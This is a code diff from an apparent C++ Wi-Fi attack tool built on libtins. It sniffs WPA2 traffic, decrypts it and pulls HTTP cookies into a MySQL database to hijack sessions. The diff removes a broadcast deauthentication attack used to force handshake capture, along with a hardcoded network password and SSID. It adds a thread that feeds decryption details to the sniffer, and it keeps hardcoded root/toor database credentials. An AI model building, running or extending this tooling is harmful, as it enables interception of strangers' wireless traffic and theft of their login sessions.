@@ -5,9 +5,9 @@
 #include <mutex>
 
 #include "sniffclass.h"
-#include "sqlmagition.h"
+#include "sqlmagician.h"
 #include "printdata.h"
-#include "regexmagition.h"
+#include "regexmagician.h"
 
 using namespace std;
 using namespace Tins;
@@ -38,31 +38,21 @@ int main(int argc, char* argv[])
     //Run AP Sniffer
     thread apParser(&APSniffer::run,&apSniffer);
 
-    //Declaration DeauthSender to send deauth packet(To decrypt WPA2 must be have EAPOL Info)
-    DeauthSender deauthSender(monitorDev);
-
-    Dot11::address_type broadcast="ff:ff:ff:ff:ff:ff";
-
+    sleep(5);
     //Declaration WPA2Sniffer
     Wpa2Sniffer wpa2Sniffer(monitorDev,parseCookies);
-    //need to modify
-    wpa2Sniffer.setPasswd("0000005801");
-    wpa2Sniffer.setSsid("olleh_WiFi_86BF");
+    thread decryptInfoReciver(&APSniffer::decryptProxyAdder,&apSniffer,ref(wpa2Sniffer));
+
+    //waiting for init
+    while(wpa2Sniffer.getPasswd()==""&&wpa2Sniffer.getSsid()=="");
 
     //CookieParser(Wpa2Decrytor run in Backgrorund) run
     thread cookieParser(&Wpa2Sniffer::run,&wpa2Sniffer);
-    sleep(2);
-    //send Deauth Packet
-    Dot11::address_type apBSSID=apSniffer.findBSSID(wpa2Sniffer.getSsid());
-    if(apBSSID!=nullptr)
-        deauthSender.sendDeauth(apBSSID,broadcast,2);
-    else
-        cout<<"AP Not Found !, Can't send Deauth Packet"<<endl;
-
-
+    //after then First DecryptInfoReciver.Add
     apParser.join();
     cookieParser.join();
-    cout<<"Nomal Exit"<<endl;
+    decryptInfoReciver.detach();
+    cout<<"***************************************Program was down***************************************"<<endl;
     return 0;
 }
 
@@ -71,10 +61,10 @@ bool parseCookies(PDU& pdu)
 {
 
     //Database Setting up
-    static SqlMagition sqlMagition("tcp://localhost:3306","root","toor","IamU");
-    static RegexMagition regexMagition;
+    static SqlMagician sqlMagition("tcp://localhost:3306","root","toor","IamU");
+    static RegexMagician regexMagition;
 
-    const TCP& tcp = pdu.rfind_pdu<TCP>();
+    const TCP& tcp= pdu.rfind_pdu<TCP>();
 
     //parse Http Packet
     if(tcp.sport()!=80&&tcp.dport()!=80) return true;
